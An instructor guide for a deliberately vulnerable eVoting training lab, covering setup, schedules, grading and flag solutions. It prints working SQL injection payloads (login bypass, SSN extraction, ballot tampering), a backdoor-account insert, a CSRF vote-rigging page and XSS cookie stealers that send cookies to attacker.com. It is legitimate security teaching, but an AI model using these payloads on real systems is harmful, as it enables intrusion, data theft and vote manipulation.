# 👨‍🏫 Instructor Guide - eVoting Security Lab

## 🎓 Course Overview

### Course Details
- **Duration**: 8-12 hours (can be split across multiple sessions)
- **Level**: Intermediate to Advanced
- **Prerequisites**: Basic web development, SQL, HTTP protocol understanding
- **Class Size**: 10-30 students
- **Format**: Hands-on lab with CTF-style challenges

### Learning Outcomes
By the end of this lab, students will be able to:
1. Identify and exploit common web vulnerabilities (OWASP Top 10)
2. Use professional security testing tools effectively
3. Write comprehensive vulnerability reports
4. Recommend practical security remediations
5. Understand the attacker's mindset and methodology
6. Apply secure coding principles

---

## 🚀 Setup Instructions for Instructors

### Pre-Class Preparation (1 week before)

#### 1. Test Environment Setup
```bash
# Clone repository
git clone <your-repo> evoting-security-lab
cd evoting-security-lab

# Test deployment
docker-compose up -d

# Verify all services
docker-compose ps
curl http://localhost:8181/evoting/login1.php
mysql -h localhost -P 3306 -u root -proot_password evoting -e "SHOW TABLES;"

# Test key vulnerabilities
python3 exploitation_framework.py http://localhost:8181
```

#### 2. Student Materials Checklist
- [ ] Student workbook (PDF)
- [ ] Payload cheatsheet (printed/digital)
- [ ] VM/Docker images ready
- [ ] Tool installation guides
- [ ] Submission template
- [ ] Grading rubric

#### 3. Infrastructure Setup
```bash
# Option A: Each student runs locally
# Provide docker-compose.yml file
# Students run: docker-compose up -d

# Option B: Central server deployment
# Deploy one instance per student on separate ports
for i in {1..30}; do
  PORT=$((8180 + i))
  DB_PORT=$((3305 + i))
  # Deploy with unique ports
done

# Option C: Cloud deployment (AWS/Azure/GCP)
# Use Terraform/CloudFormation for automated deployment
```

#### 4. Monitoring Setup
```bash
# Install monitoring for student progress
# Track which flags have been found
# Monitor for any destructive actions

# Example: ELK stack for log monitoring
docker run -d --name elasticsearch ...
docker run -d --name kibana ...
docker run -d --name logstash ...
```

---

## 📚 Class Structure

### Day 1: Introduction & Setup (2-3 hours)

#### Hour 1: Theory (45 min)
**Topics to cover:**
- Web application security landscape
- OWASP Top 10 overview
- Legal and ethical considerations
- Lab objectives and rules

**Slides/Talking Points:**
1. Real-world breach examples (Equifax, Target, etc.)
2. Cost of security breaches
3. Importance of secure development
4. Career opportunities in security

**Demo:** Live vulnerability demonstration
```bash
# Show quick SQL injection demo
# Explain what happened
# Show the vulnerable code
# Show the fix
```

#### Hour 2: Environment Setup (45 min)
**Guided Setup:**
1. Verify Docker installation
2. Clone repository
3. Start containers
4. Test access to application
5. Configure Burp Suite
6. Test basic functionality

**Common Issues:**
- Docker not running → `sudo systemctl start docker`
- Port conflicts → Check with `netstat -tulpn`
- Permission errors → Add user to docker group
- Database connection fails → Check mysql container logs

#### Hour 3: Reconnaissance Exercise (30 min)
**Guided Activity:**
- Explore the application together
- Identify all pages and forms
- View source code
- Check for directory listings
- Find first flag as a class

**Expected Findings:**
- FLAG-CONFIG-001: Exposed credentials in source
- FLAG-BAC-001: Direct admin page access
- FLAG-CONFIG-002: Debug information in comments

---

### Day 2: SQL Injection Deep Dive (3-4 hours)

#### Hour 1: SQL Injection Theory (30 min)
**Topics:**
- What is SQL injection?
- Types: Classic, Union, Blind, Time-based
- Impact and real-world examples
- Prevention techniques

**Live Coding Demo:**
```php
// Show vulnerable code
$query = "SELECT * FROM users WHERE username='$user'";

// Explain the attack
// Input: admin' OR '1'='1
// Result: SELECT * FROM users WHERE username='admin' OR '1'='1'

// Show secure code
$stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
```

#### Hour 2-3: Hands-on SQL Injection (90 min)
**Exercises:**
1. Authentication bypass (20 min)
2. Union-based extraction (30 min)
3. Blind SQL injection (40 min)

**Walk-through first exercise together:**
```
1. Open login page
2. Try: admin' OR '1'='1
3. Observe response
4. Understand what happened
5. Document finding
```

**Monitor progress:**
- Check which students found FLAG-SQL-001
- Provide hints to struggling students
- Challenge advanced students with blind SQLi

#### Hour 4: SQLMap Tutorial (30 min)
**Demonstrate automated exploitation:**
```bash
# Show SQLMap in action
sqlmap -u "http://localhost:8181/evoting/login1.php" \
  --forms --batch --dump

# Explain the output
# Discuss automated vs manual testing
# Pros and cons of automation
```

---

### Day 3: XSS and Authentication (3 hours)

#### Hour 1: XSS Theory and Practice (60 min)
**Theory (20 min):**
- Types of XSS
- Impact scenarios
- Real-world examples
- Prevention methods

**Practice (40 min):**
- Reflected XSS in login
- Stored XSS in descriptions
- Cookie stealing demo
- XSS filters bypass

**Live Demo:**
```html
<!-- Show basic XSS -->
<script>alert(document.cookie)</script>

<!-- Show cookie stealer -->
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>

<!-- Show mitigation -->
<?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?>
```

#### Hour 2: Authentication Attacks (60 min)
**Topics:**
- Hardcoded credentials
- Session management flaws
- Brute force attacks
- Session hijacking

**Exercises:**
1. Find hardcoded credentials
2. Test session validation
3. Direct admin access
4. Session token analysis

---

### Day 4: Advanced Topics & CTF (4 hours)

#### Hour 1: CSRF and Access Control (60 min)
**CSRF Demo:**
```html
<!-- Create malicious page together -->
<form action="http://target.com/vote" method="POST" id="csrf">
    <input type="hidden" name="candidate" value="Attacker">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Access Control Testing:**
- Direct URL access
- Parameter tampering
- Privilege escalation
- Horizontal access control bypass

#### Hour 2-4: Capture the Flag Competition (180 min)
**Competition Format:**
```
1. All flags are now available
2. Students compete individually or in teams
3. Track progress on leaderboard
4. First to find each flag gets bonus points
5. Must document all findings
```

**Instructor Role:**
- Monitor leaderboard
- Provide hints (with point deduction)
- Ensure fair play
- Identify learning opportunities

**Leaderboard Updates:**
```bash
# Use simple script to track progress
# Display on projector
# Update every 5 minutes
```

---

## 🎯 Flag Solutions Guide

### All Flags with Solutions

#### Easy Flags

**FLAG-CONFIG-001: Exposed Credentials**
- **Location**: login1.php, connect.php, docker-compose.yml
- **Solution**: View source code, search for "password"
- **Credentials**: Admin187:password187, root:root_password
- **Time**: 2-5 minutes

**FLAG-AUTH-001: Hardcoded Login**
- **Location**: login1.php lines 30-38
- **Solution**: Login with Admin187:password187
- **Impact**: Complete admin access
- **Time**: 1-2 minutes

**FLAG-BAC-001: Direct Admin Access**
- **Location**: AdminCode.php, DeleteUser.php
- **Solution**: Navigate directly to URL without authentication
- **Test**: http://localhost:8181/evoting/AdminCode.php
- **Time**: 2-3 minutes

**FLAG-SQL-001: Basic SQL Injection**
- **Location**: login1.php line 25
- **Payload**: `admin' OR '1'='1`
- **Solution**: Bypass authentication with boolean injection
- **Time**: 5-10 minutes

**FLAG-XSS-001: Reflected XSS**
- **Location**: login1.php error message
- **Payload**: `<script>alert('XSS')</script>`
- **Solution**: Inject script in username field
- **Time**: 3-5 minutes

#### Medium Flags

**FLAG-SQL-003: Union-Based Injection**
- **Location**: login1.php, MyPollingStation.php
- **Payload**: `admin' UNION SELECT CitizenNum,Username,Password,SSN,1,2,3,4,5 FROM person_info--`
- **Solution**: Extract data using UNION SELECT
- **Time**: 15-20 minutes

**FLAG-SQL-005: Injection in Voting**
- **Location**: electioninfo2016.php line 85
- **Payload**: `'; UPDATE ballot SET President_Selection='Hacked' WHERE 1=1--`
- **Solution**: Manipulate voting data
- **Time**: 20-30 minutes

**FLAG-BAC-002: Multiple Voting**
- **Location**: electioninfo2016.php
- **Solution**: Change VoterId parameter to vote multiple times
- **Method**: Vote → Change VoterId → Vote again
- **Time**: 10-15 minutes

**FLAG-CSRF-001: Vote CSRF**
- **Location**: electioninfo2016.php
- **Solution**: Create malicious page with auto-submit form
- **Test**: Host HTML file, have "victim" visit
- **Time**: 25-35 minutes

**FLAG-XSS-002: Stored XSS**
- **Location**: AddNewCandidate.php, candidate descriptions
- **Payload**: `<script>alert('Stored')</script>` in description
- **Solution**: Add candidate with XSS payload
- **Time**: 20-30 minutes

#### Hard Flags

**FLAG-ADV-002: Blind SQL Injection**
- **Location**: electioninfo2016.php StateNum parameter
- **Payload**: `1' AND (SELECT SLEEP(5))--`
- **Solution**: Use timing attack to confirm injection
- **Time**: 30-45 minutes

**FLAG-SQL-006 to FLAG-SQL-011: Deletion Injection**
- **Location**: DeleteUser.php multiple queries
- **Payload**: `1 OR 1=1` in CitizenNum
- **Solution**: Delete all users or extract data before deletion
- **Time**: 25-40 minutes

**FLAG-DATA-001: SSN Extraction**
- **Location**: Multiple tables
- **Solution**: SQL injection to extract SSN from person_info
- **Method**: Union-based or direct database access
- **Time**: 20-35 minutes

#### Expert Flags

**SECRET-FLAG-001: Complete Chain**
- **Requirements**: Chain 3+ vulnerabilities
- **Solution**: SQLi → Admin Access → Data Manipulation → CSRF
- **Steps**:
  1. SQL injection to bypass login
  2. Access admin panel
  3. Extract all voter data
  4. Modify election results
  5. Use CSRF to spread malicious votes
- **Time**: 60-90 minutes

**SECRET-FLAG-002: Database Dump**
- **Solution**: Full database extraction via PHPMyAdmin or direct MySQL access
- **Method**: Use found credentials to connect to MySQL
- **Command**: `mysqldump -h localhost -u root -proot_password evoting > dump.sql`
- **Time**: 45-60 minutes

**SECRET-FLAG-003: Persistent Backdoor**
- **Solution**: Create hidden admin account that survives resets
- **Method**: SQL injection to insert into person_info and voter tables
- **Payload**: 
```sql
INSERT INTO person_info VALUES (999999999,'backdoor','user','M','NA','2000-01-01','hidden_admin','secret_pass',999999999);
INSERT INTO voter VALUES (99999,'backdoor user',0,999999999);
```
- **Time**: 60-120 minutes

---

## 📊 Grading Rubric

### Point Distribution

#### Flags Found (40%)
- Easy flags (1-5): 100 points each
- Medium flags (6-10): 150 points each
- Hard flags (11-15): 200 points each
- Expert flags (16-18): 300 points each
- **Total**: 3,375 points possible
- **Grade Calculation**: (Points Earned / 3375) × 40

#### Vulnerability Report (30%)
- **Format and Organization (5%)**: Professional structure, clear sections
- **Technical Accuracy (10%)**: Correct vulnerability identification and analysis
- **Proof of Concept (5%)**: Working PoC code or screenshots
- **Impact Assessment (5%)**: Accurate risk analysis
- **Remediation Recommendations (5%)**: Practical, specific fixes

#### Technical Understanding (20%)
- **Methodology (5%)**: Systematic approach to testing
- **Tool Usage (5%)**: Proper use of Burp, SQLMap, etc.
- **Problem Solving (5%)**: Ability to overcome obstacles
- **Innovation (5%)**: Creative exploitation methods

#### Presentation/Documentation (10%)
- **Screenshots (3%)**: Clear, annotated evidence
- **Write-up Quality (4%)**: Clear explanations
- **Completeness (3%)**: All required sections included

### Bonus Points
- First to find any flag: +10 points per flag
- Finding undocumented vulnerability: +50 points
- Creating automated exploit: +100 points
- Helping classmates: +25 points per valid hint

### Penalties
- Using provided hints: -25 points per hint
- Causing service disruption: -100 points
- Not documenting findings: -50 points per finding

---

## 🛠️ Troubleshooting Guide

### Common Student Issues

#### Issue: Can't connect to application
**Solution:**
```bash
# Check if containers are running
docker-compose ps

# Check logs
docker-compose logs web
docker-compose logs db

# Restart services
docker-compose restart

# Nuclear option
docker-compose down
docker-compose up -d --build
```

#### Issue: Database connection errors
**Solution:**
```bash
# Verify database is accessible
docker-compose exec db mysql -uroot -proot_password -e "SHOW DATABASES;"

# Check environment variables
docker-compose exec web env | grep DB_

# Reinitialize database
docker-compose exec db mysql -uroot -proot_password evoting < /docker-entrypoint-initdb.d/01-schema.sql
```

#### Issue: Burp Suite not intercepting
**Solution:**
```
1. Check browser proxy settings (127.0.0.1:8080)
2. Import Burp's CA certificate
3. Ensure intercept is ON in Burp
4. Check if target is in scope
5. Try incognito/private mode
```

#### Issue: SQLMap not working
**Solution:**
```bash
# Update SQLMap
git pull

# Use correct syntax
sqlmap -u "URL" --forms --batch

# Increase verbosity
sqlmap -u "URL" --forms -v 3

# Try manual injection first to confirm vuln
```

---

## 🎓 Teaching Tips

### Engagement Strategies
1. **Start with a hook**: Show real breach example
2. **Make it competitive**: Use leaderboard
3. **Celebrate wins**: Acknowledge first flags found
4. **Provide hints strategically**: Don't give away solutions
5. **Encourage collaboration**: Allow discussion
6. **Share war stories**: Relate to real penetration tests

### Pacing Recommendations
- **Slow students**: Provide more guided exercises
- **Fast students**: Challenge with expert flags
- **Mixed class**: Group slower with faster students
- **Everyone stuck**: Give class-wide hint or demo

### Common Teaching Moments

**When everyone finds FLAG-SQL-001:**
"Great! Now that you've bypassed authentication, what could an attacker do with this access? What data could they steal? This is why we need prepared statements..."

**When someone finds a creative solution:**
"Excellent work! [Student] found an alternative method I hadn't considered. This shows there are multiple paths to exploitation..."

**When discussing impact:**
"Imagine this was a real voting system. What would be the consequences of manipulating election results? This is why security isn't just technical - it has real-world implications..."

---

## 📈 Progress Tracking

### Monitor Student Progress
```bash
# Create simple leaderboard script
# Track flags found by student ID
# Display on projector

# Example leaderboard.sh
#!/bin/bash
clear
echo "=== EVOTING SECURITY LAB LEADERBOARD ==="
echo "Updated: $(date)"
echo "========================================"
cat scores.txt | sort -rn -k2 | head -10
```

### Flag Submission System
```python
# Simple flag submission web app
# Students submit flags with proof
# Auto-validation and scoring

from flask import Flask, request, jsonify
app = Flask(__name__)

flags = {
    'FLAG-SQL-001': 100,
    'FLAG-XSS-001': 75,
    # ... all flags
}

@app.route('/submit', methods=['POST'])
def submit_flag():
    student_id = request.json['student_id']
    flag = request.json['flag']
    proof = request.json['proof']
    
    if flag in flags:
        # Award points
        return jsonify({'success': True, 'points': flags[flag]})
    return jsonify({'success': False})
```

---

## 📝 Sample Solutions for Reference

### Complete SQL Injection Attack Chain

```bash
# Step 1: Discover injection point
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=test'&Password=test&submit=login"
# Error reveals SQL syntax issue

# Step 2: Confirm vulnerability
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=admin' OR '1'='1&Password=x&submit=login" -L

# Step 3: Determine column count
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=admin' ORDER BY 9--&Password=x&submit=login"
# Increase number until error

# Step 4: Extract data
curl -X POST http://localhost:8181/evoting/login1.php \
  -d "Username=admin' UNION SELECT 1,Username,Password,SSN,5,6,7,8,9 FROM person_info--&Password=x&submit=login"

# Step 5: Automate with SQLMap
sqlmap -u "http://localhost:8181/evoting/login1.php" \
  --forms --batch --dump -D evoting -T person_info
```

### Complete XSS to Cookie Theft

```html
<!-- Step 1: Create malicious payload -->
<script>
fetch('http://attacker.com/steal?cookie=' + btoa(document.cookie))
</script>

<!-- Step 2: Host listener (attacker machine) -->
python3 -m http.server 8888

<!-- Step 3: Inject into candidate description -->
<!-- Navigate to AddNewCandidate.php -->
<!-- Insert payload in description field -->

<!-- Step 4: When victim views candidate -->
<!-- Cookie is sent to attacker server -->

<!-- Step 5: Use stolen cookie -->
<!-- Replace your cookie with victim's cookie -->
<!-- Access their session -->
```

### Complete CSRF Attack

```html
<!-- csrf_attack.html -->
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Congratulations!</h1>
    <p>Click below to claim your prize!</p>
    
    <!-- Hidden auto-submit form -->
    <form id="malicious" action="http://localhost:8181/evoting/electioninfo2016.php" method="POST">
        <input type="hidden" name="president" value="Evil Candidate">
        <input type="hidden" name="VoterId" value="50001">
        <input type="hidden" name="StateNum" value="1">
        <input type="hidden" name="submit" value="Submit">
    </form>
    
    <button onclick="document.getElementById('malicious').submit()">
        Claim Prize!
    </button>
    
    <!-- Or auto-submit -->
    <script>
        setTimeout(function() {
            document.getElementById('malicious').submit();
        }, 3000);
    </script>
</body>
</html>
```

---

## 🎬 Video Tutorial Scripts

### Video 1: Environment Setup (5 min)

**Script:**
```
[0:00] "Welcome to the eVoting Security Lab!"
[0:15] "Today we'll set up your testing environment"
[0:30] Show terminal, run: docker-compose up -d
[1:00] "While containers start, let's discuss what we have"
[1:15] Explain 3 services: web, db, phpmyadmin
[2:00] Show: docker-compose ps
[2:30] Access application in browser
[3:00] Configure Burp Suite proxy
[4:00] Test basic functionality
[4:30] "You're ready to start hacking!"
```

### Video 2: First SQL Injection (8 min)

**Script:**
```
[0:00] "Let's find our first vulnerability"
[0:30] Open login page, inspect source code
[1:00] Point out lack of input validation
[1:30] Try basic login: admin/password - fails
[2:00] "What if we try SQL injection?"
[2:30] Explain: admin' OR '1'='1
[3:30] Show in Burp Suite what's happening
[4:30] Inject payload, show successful bypass
[5:30] Explain WHY it worked (SQL query structure)
[6:30] Show vulnerable code
[7:30] Show secure code with prepared statements
```

### Video 3: Advanced Attack Chain (15 min)

**Script:**
```
[0:00] "Real attackers chain vulnerabilities"
[0:45] "Let's demonstrate a complete attack"
[1:30] Step 1: SQL injection to bypass login
[3:00] Step 2: Access admin panel (no auth check)
[4:30] Step 3: Extract voter database
[6:00] Step 4: Manipulate voting results
[8:00] Step 5: Create CSRF to spread votes
[10:00] Step 6: Cover tracks (if possible)
[12:00] Review complete attack chain
[13:30] Discuss real-world impact
[14:30] Show all remediations needed
```

---

## 📊 Assessment Examples

### Quiz Questions

**Multiple Choice:**

1. Which of the following is the MOST effective prevention for SQL injection?
   - A) Input validation
   - B) Web Application Firewall
   - C) Parameterized queries ✓
   - D) Encoding output

2. What is the primary risk of storing passwords in plaintext?
   - A) Database size increases
   - B) Slower authentication
   - C) Complete credential compromise if database breached ✓
   - D) Users forget passwords

3. CSRF attacks can be prevented by:
   - A) Using HTTPS only
   - B) Implementing CSRF tokens ✓
   - C) Disabling cookies
   - D) Input validation

**Short Answer:**

1. Explain why `mysql_escape_string()` is not sufficient to prevent SQL injection.
   
   **Expected Answer:** While mysql_escape_string() prevents some injection by escaping quotes, it doesn't prevent all attack vectors (numeric fields, LIKE clauses) and the function is deprecated. Prepared statements with parameterized queries are the only complete solution as they separate SQL structure from data.

2. Describe the difference between reflected and stored XSS. Provide an example of each.
   
   **Expected Answer:** Reflected XSS occurs when user input is immediately returned in the response (e.g., search results). Stored XSS is when malicious script is saved to database and executed when other users view it (e.g., comment section). Reflected: `search.php?q=<script>alert(1)</script>`. Stored: Posting `<script>alert(1)</script>` in a forum that saves to database.

3. What is the security principle violated when admin pages are accessible without authentication?
   
   **Expected Answer:** Broken Access Control / Failure to implement proper authorization. The application fails to verify user identity and permissions before granting access to sensitive functionality, violating the principle of least privilege.

**Practical Exam:**

Given this vulnerable code, identify the vulnerability and provide a secure version:
```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysql_query($query);
```

**Expected Answer:**
- Vulnerability: SQL Injection in numeric parameter, deprecated mysql_* function
- Secure version:
```php
$id = intval($_GET['id']); // Type casting for numeric
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
```

---

## 🎯 Additional Challenges (Optional)

### Advanced Challenge 1: Write a Complete Exploit
**Task:** Create a Python script that:
1. Bypasses login via SQL injection
2. Extracts all voter data
3. Casts 100 fraudulent votes
4. Generates a report of actions taken

**Solution Template:**
```python
import requests
import json

class VotingExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def bypass_login(self):
        # Student implements
        pass
    
    def extract_voters(self):
        # Student implements
        pass
    
    def cast_votes(self, count=100):
        # Student implements
        pass
    
    def generate_report(self):
        # Student implements
        pass
```

### Advanced Challenge 2: Create Defense
**Task:** Fork the application and fix ALL vulnerabilities found. Submit a pull request with:
- Secure code changes
- Unit tests for security
- Documentation of changes

**Grading Criteria:**
- All SQLi fixed: 30 points
- All XSS fixed: 20 points
- Authentication secured: 20 points
- CSRF protection added: 15 points
- Tests written: 15 points

### Advanced Challenge 3: Red Team vs Blue Team
**Format:** Divide class into two teams
- **Red Team:** Finds and exploits vulnerabilities
- **Blue Team:** Monitors, detects, and responds to attacks

**Setup:**
```bash
# Add logging and monitoring for Blue Team
docker-compose exec web tail -f /var/log/apache2/access.log
docker-compose exec db mysql -uroot -proot_password -e "SHOW PROCESSLIST;"

# Blue Team must:
1. Detect attacks in real-time
2. Identify attack patterns
3. Block malicious IPs (simulate with iptables)
4. Document incidents
```

---

## 📧 Communication Templates

### Pre-Lab Email to Students

```
Subject: eVoting Security Lab - Preparation Required

Dear Students,

Next week we'll be conducting a hands-on security lab where you'll learn to identify and exploit common web vulnerabilities ethically.

REQUIRED PREPARATION:
1. Install Docker Desktop (https://www.docker.com/products/docker-desktop)
2. Install Burp Suite Community Edition (https://portswigger.net/burp/communitydownload)
3. Ensure you have 10GB free disk space
4. Review OWASP Top 10 (https://owasp.org/www-project-top-ten/)

WHAT TO BRING:
- Laptop with admin privileges
- Notebook for documentation
- Curiosity and ethical mindset

IMPORTANT LEGAL NOTE:
The techniques you'll learn are ONLY to be used in this authorized lab environment. Unauthorized access to computer systems is illegal and will result in serious consequences.

Looking forward to seeing you in the lab!

[Your Name]
```

### Post-Lab Survey

```
1. Rate the lab difficulty (1-10): ____
2. How many hours did you spend: ____
3. Most valuable skill learned: __________
4. What was most challenging: __________
5. Suggestions for improvement: __________
6. Would you recommend this lab: Yes / No
7. Additional comments: __________
```

---

## 🔒 Safety & Ethics

### Lab Rules (Print and Display)

```
EOVTING SECURITY LAB RULES

✓ DO:
- Test ONLY the provided lab environment
- Document all findings professionally
- Help classmates learn
- Ask questions when stuck
- Report any issues to instructor
- Have fun and learn!

✗ DON'T:
- Test techniques on external websites
- Share exploits publicly before disclosure period
- Cause unnecessary service disruption
- Access other students' systems without permission
- Use techniques maliciously after class
- Share solutions with other students before they attempt

PENALTIES:
- 1st violation: Warning + point deduction
- 2nd violation: Lab failure
- 3rd violation: Academic integrity violation report

Remember: With great power comes great responsibility.
```

### Ethical Hacking Agreement

**Students must sign:**

```
ETHICAL HACKING AGREEMENT

I, [Student Name], understand that I am learning techniques that could be used maliciously. I agree to:

1. Use these skills only in authorized environments
2. Never access systems without explicit permission
3. Follow responsible disclosure practices
4. Respect user privacy and data protection laws
5. Seek proper authorization before any security testing
6. Report any actual vulnerabilities responsibly

I understand that unauthorized computer access is illegal and can result in:
- Criminal prosecution
- Civil liability
- Academic expulsion
- Professional license revocation

By signing, I commit to using these skills ethically and legally.

Signature: _________________ Date: _________
```

---

## 📈 Success Metrics

### Track These Metrics:

**Completion Rates:**
- % students who found all easy flags: ____%
- % students who found medium flags: ____%
- % students who found hard flags: ____%
- % students who completed report: ____%

**Time Metrics:**
- Average time to first flag: ____ minutes
- Average time to complete easy flags: ____ minutes
- Average total lab time: ____ hours

**Learning Outcomes:**
- % who can identify SQL injection: ____%
- % who can write secure code: ____%
- % who understand OWASP Top 10: ____%

**Satisfaction:**
- Average difficulty rating (1-10): ____
- Would recommend to others: ____%
- Most valuable skill learned: __________

---

## 🎓 Continuing Education

### Recommended Next Steps for Students:

**Certifications:**
1. CEH (Certified Ethical Hacker)
2. OSCP (Offensive Security Certified Professional)
3. GWAPT (GIAC Web Application Penetration Tester)
4. eWPT (eLearnSecurity Web Application Penetration Tester)

**Platforms:**
1. HackTheBox (https://hackthebox.eu)
2. TryHackMe (https://tryhackme.com)
3. PentesterLab (https://pentesterlab.com)
4. PortSwigger Web Security Academy (https://portswigger.net/web-security)

**Books:**
1. "The Web Application Hacker's Handbook" - Dafydd Stuttard
2. "OWASP Testing Guide" - OWASP Foundation
3. "Real-World Bug Hunting" - Peter Yaworski

**Communities:**
1. OWASP Local Chapters
2. HackerOne/BugCrowd platforms
3. Security conferences (DEF CON, Black Hat, BSides)

---

## 📞 Support Resources

### For Instructors:

**Technical Issues:**
- Docker Support: https://docs.docker.com/
- MySQL Issues: https://dev.mysql.com/doc/
- PHP Documentation: https://php.net/docs.php

**Pedagogical Support:**
- OWASP Education Committee
- NICE Framework for Cybersecurity Education
- ACM SIGCSE (Computer Science Education)

**Legal/Ethical Questions:**
- EFF (Electronic Frontier Foundation)
- Local cybersecurity lawyer consultation
- University legal counsel

### For Students:

**Getting Stuck:**
1. Review documentation thoroughly
2. Check HTML comments for hints
3. Search OWASP resources
4. Ask classmates (don't share solutions)
5. Ask instructor (with point penalty)

**Technical Problems:**
1. Check troubleshooting guide
2. Search error messages
3. Post in class forum
4. Email instructor with:
   - Exact error message
   - Steps taken
   - Screenshots
   - Docker logs

---

## 🏆 Success Stories

### Example Student Achievements:

**Student A - Career Change:**
"This lab changed my career trajectory. I was a web developer, but after experiencing the attacker mindset, I transitioned to application security. Now I lead security testing at a Fortune 500 company."

**Student B - Bug Bounty Success:**
"The techniques learned in this lab directly translated to my bug bounty hunting. I found my first critical vulnerability worth $5,000 within a month of completing the course."

**Student C - Secure Development:**
"As a developer, this lab was eye-opening. I now write more secure code from the start and can better review my team's code for vulnerabilities."

---

## 🔄 Lab Maintenance

### Regular Updates Needed:

**Weekly:**
- [ ] Verify Docker images are running
- [ ] Check for any service issues
- [ ] Review student progress logs
- [ ] Update leaderboard

**Monthly:**
- [ ] Update vulnerable code with new challenges
- [ ] Add new flags based on student feedback
- [ ] Update tool versions (Burp, SQLMap)
- [ ] Review and update documentation

**Semester:**
- [ ] Refresh vulnerable application
- [ ] Add new vulnerability types
- [ ] Update to latest OWASP Top 10
- [ ] Revise based on student feedback

### Version Control:
```bash
# Tag releases for each semester
git tag -a v2025.1 -m "Spring 2025 version"
git push origin v2025.1

# Branch for experimental features
git checkout -b experimental/new-vulnerabilities

# Keep master stable for current semester
git checkout master
```

---

## 📄 License & Attribution

### Licensing Information:

```
eVoting Security Lab
Educational Use Only - Not for Production

Original Application: eVoting (college project)
Security Lab Version: [Your Name/Institution]
License: Educational/Non-Commercial Use

ATTRIBUTION REQUIRED:
When using or adapting this lab, please credit:
- Original creator
- Your institution
- OWASP resources used
- Any other contributors

DISCLAIMER:
This application contains intentional security vulnerabilities
for educational purposes only. Never deploy to production or
public-facing servers.
```

---

## ✅ Pre-Class Checklist

**1 Week Before:**
- [ ] Test environment completely
- [ ] Print student materials
- [ ] Prepare presentation slides
- [ ] Set up monitoring system
- [ ] Test all flags are findable
- [ ] Prepare hint system
- [ ] Set up leaderboard

**1 Day Before:**
- [ ] Send reminder email to students
- [ ] Verify all services running
- [ ] Prepare backup USB drives with materials
- [ ] Test projector/screen sharing
- [ ] Prepare prize for top performers (optional)

**Day Of:**
- [ ] Arrive 30 minutes early
- [ ] Test internet connectivity
- [ ] Start Docker containers
- [ ] Display leaderboard on screen
- [ ] Have troubleshooting guide ready
- [ ] Set timer for exercises

---

## 🎉 Conclusion

This lab provides a comprehensive, hands-on introduction to web application security testing. By combining theoretical knowledge with practical exploitation, students gain invaluable experience that prepares them for careers in cybersecurity or secure software development.

**Remember:** The goal is not just to teach exploitation techniques, but to create security-minded professionals who understand both offense and defense.

**Good luck with your class! 🚀**

---

*For questions, suggestions, or contributions to this lab, please contact [Your Email] or open an issue on the GitHub repository.*

*Last Updated: [Date]*
*Version: 1.0*
